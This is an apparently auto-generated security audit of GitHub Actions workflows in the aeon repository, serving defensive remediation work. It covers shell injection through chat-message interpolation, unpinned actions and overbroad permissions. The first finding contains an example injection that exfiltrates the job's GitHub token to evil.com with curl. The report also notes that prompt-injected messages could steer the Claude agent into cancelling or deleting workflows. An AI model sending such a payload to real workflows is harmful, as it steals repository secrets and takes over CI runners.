# Workflow Security Audit — 2026-04-11

**Repo:** [aeonfun/aeon](https://github.com/aeonfun/aeon)
**Files audited:** `aeon.yml`, `messages.yml`, `scheduler.yml`, `chain-runner.yml`
**Total findings:** 6 (2 critical, 0 high, 3 medium, 1 low)
**Auto-fixed:** 2 critical findings in `messages.yml`

---

## Findings

### [CRITICAL] Script injection via user-controlled message in `messages.yml` Run step

**File:** `.github/workflows/messages.yml` | **Step:** `Run`
**Pattern:**
```yaml
SOURCE="${{ steps.msg.outputs.source }}"
MESSAGE="${{ steps.msg.outputs.message }}"
```
**Risk:** `steps.msg.outputs.message` contains verbatim text sent by a Telegram, Discord, or Slack user. GitHub Actions performs template substitution before the shell executes, so if a user sends a message like `$(curl -s https://evil.com/?t=$GITHUB_TOKEN)`, the resulting shell script assigns the *output of that command* to `MESSAGE`. This grants full remote code execution with access to `GH_GLOBAL`, `ANTHROPIC_API_KEY`, `ALCHEMY_API_KEY`, and all other secrets in the job's `env:` block.

**Fix:**
```yaml
# BEFORE (vulnerable):
env:
  ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
run: |
  SOURCE="${{ steps.msg.outputs.source }}"
  MESSAGE="${{ steps.msg.outputs.message }}"

# AFTER (safe — env var intermediary prevents shell interpolation):
env:
  ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
  _MSG_SOURCE: ${{ steps.msg.outputs.source }}
  _MSG_MESSAGE: ${{ steps.msg.outputs.message }}
run: |
  SOURCE="$_MSG_SOURCE"
  MESSAGE="$_MSG_MESSAGE"
```
**Status:** ✅ Auto-fixed in this PR

---

### [CRITICAL] Script injection via `inputs.message` in `messages.yml` Extract message step

**File:** `.github/workflows/messages.yml` | **Step:** `Extract message`
**Pattern:**
```yaml
run: |
  else
    MESSAGE="${{ inputs.message }}"
    SOURCE="${{ inputs.source }}"
  fi
```
**Risk:** `inputs.message` is set by the `poll` job via `gh workflow run messages.yml -f message="$TEXT"`, where `$TEXT` is a jq-extracted string from the messaging platform. If `$TEXT` contains `"` followed by a shell command, it breaks out of the assignment. An attacker who can send Telegram/Discord/Slack messages to the configured channel can execute arbitrary commands in the workflow runner, even before the message is processed by Claude.

**Fix:**
```yaml
# BEFORE (vulnerable):
- name: Extract message
  id: msg
  run: |
    ...
    else
      MESSAGE="${{ inputs.message }}"
      SOURCE="${{ inputs.source }}"
    fi

# AFTER (safe):
- name: Extract message
  id: msg
  env:
    _INPUT_MESSAGE: ${{ inputs.message }}
    _INPUT_SOURCE: ${{ inputs.source }}
  run: |
    ...
    else
      MESSAGE="$_INPUT_MESSAGE"
      SOURCE="$_INPUT_SOURCE"
    fi
```
**Status:** ✅ Auto-fixed in this PR

---

### [MEDIUM] `Log token usage` and `Commit results` steps also interpolate `steps.msg.outputs.source`

**File:** `.github/workflows/messages.yml` | **Steps:** `Log token usage`, `Commit results`
**Pattern:**
```bash
SOURCE="${{ steps.msg.outputs.source }}"   # Log token usage
SOURCE="${{ steps.msg.outputs.source }}"   # Commit results
```
**Risk:** Lower severity than the Run step because these steps do not pass `$SOURCE` to subshell commands — it's used only in `echo` statements and commit message strings. However, a crafted source value (if the messaging platform is ever expanded beyond the hardcoded `telegram/discord/slack` set) could break the commit message or step summary. Defense-in-depth fix applied.

**Fix:** Same env-var intermediary pattern.
**Status:** ✅ Auto-fixed in this PR (all four direct interpolations in `messages.yml` eliminated)

---

### [MEDIUM] Third-party actions not pinned to commit SHAs

**Files:** All four workflows
**Pattern:** `uses: actions/checkout@v5`, `uses: actions/setup-node@v5`
**Risk:** Semver tags like `@v5` are mutable — the tag owner can update them to point to a different commit. If `actions/checkout` were compromised and `@v5` updated, all Aeon workflow runs would execute the malicious code. For GitHub's own `actions/*` namespace, this risk is low (GitHub controls these tags), but it violates supply-chain security best practices and is worth noting for fork operators who may copy these workflows.
**Fix:** Pin to a specific commit SHA:
```yaml
# Example (verify current SHA before applying):
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v5.2.0
uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020  # v5.0.0
```
**Status:** Manual action required — verify current SHA for each action version before pinning.

---

### [MEDIUM] `messages.yml` grants `actions: write` at the workflow level

**File:** `.github/workflows/messages.yml`
**Pattern:**
```yaml
permissions:
  contents: write
  pull-requests: write
  issues: read
  actions: write
```
**Risk:** `actions: write` permits canceling, deleting, and re-running any workflow in the repo — not just triggering `messages.yml`. The `poll` job needs `actions: write` to call `gh workflow run messages.yml`. However, the `run` job (which executes user messages via Claude Code) receives the same broad permission. If the Claude invocation or a prompt-injected message were to call `gh run cancel` or `gh workflow delete`, it could disrupt agent operations.
**Fix:** Split job-level permissions:
```yaml
jobs:
  poll:
    permissions:
      actions: write   # needed for gh workflow run
    ...
  run:
    permissions:
      contents: write
      pull-requests: write
      # no actions: write — run job doesn't dispatch workflows directly
    ...
```
**Status:** Manual action required — split permissions per-job.

---

### [LOW] `scheduler.yml` uses `GH_GLOBAL || GITHUB_TOKEN` fallback without scope audit

**File:** `.github/workflows/scheduler.yml`
**Pattern:**
```yaml
env:
  GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
```
**Risk:** `GH_GLOBAL` is a fine-grained PAT with elevated permissions (needed to push workflow file changes). The scheduler uses this token to dispatch `aeon.yml` and `chain-runner.yml` runs. If the scheduler itself were compromised (e.g., via a malicious `aeon.yml` edit), the elevated `GH_GLOBAL` token would be available to the dispatch step. The scheduler does not need `contents: write` from a PAT — the `GITHUB_TOKEN` is sufficient for `gh workflow run`.
**Fix:** Consider using `secrets.GITHUB_TOKEN` for the scheduler's dispatch step, reserving `GH_GLOBAL` only for steps that explicitly need cross-repo or workflow-file write access.
**Status:** Low priority — requires evaluating which specific steps actually need `GH_GLOBAL`.

---

## What Was Fixed

All changes are in `.github/workflows/messages.yml`:

1. **`Extract message` step** — Added `env: _INPUT_MESSAGE` and `env: _INPUT_SOURCE`; replaced `"${{ inputs.message }}"` and `"${{ inputs.source }}"` with `"$_INPUT_MESSAGE"` and `"$_INPUT_SOURCE"`.

2. **`Run` step** — Added `_MSG_SOURCE` and `_MSG_MESSAGE` to the existing `env:` block; replaced the two direct `${{ steps.msg.outputs.* }}` interpolations with `"$_MSG_SOURCE"` and `"$_MSG_MESSAGE"`.

3. **`Log token usage` step** — Added `env:` block for all five step outputs; replaced all `${{ steps.run.outputs.* }}` and `${{ steps.msg.outputs.source }}` references with env var equivalents.

4. **`Commit results` step** — Added `env: _COMMIT_SOURCE`; replaced `"${{ steps.msg.outputs.source }}"` with `"$_COMMIT_SOURCE"`.

---

## What Requires Manual Review

| Finding | Severity | Effort |
|---------|----------|--------|
| Pin `actions/checkout` and `actions/setup-node` to commit SHAs in all four workflows | Medium | 30 min |
| Split `messages.yml` permissions to grant `actions: write` only to the `poll` job | Medium | 1 hour |
| Audit `GH_GLOBAL` usage in `scheduler.yml` — use `GITHUB_TOKEN` where PAT not needed | Low | 2 hours |

---

*Generated by the `workflow-audit` skill — [aeonfun/aeon](https://github.com/aeonfun/aeon)*
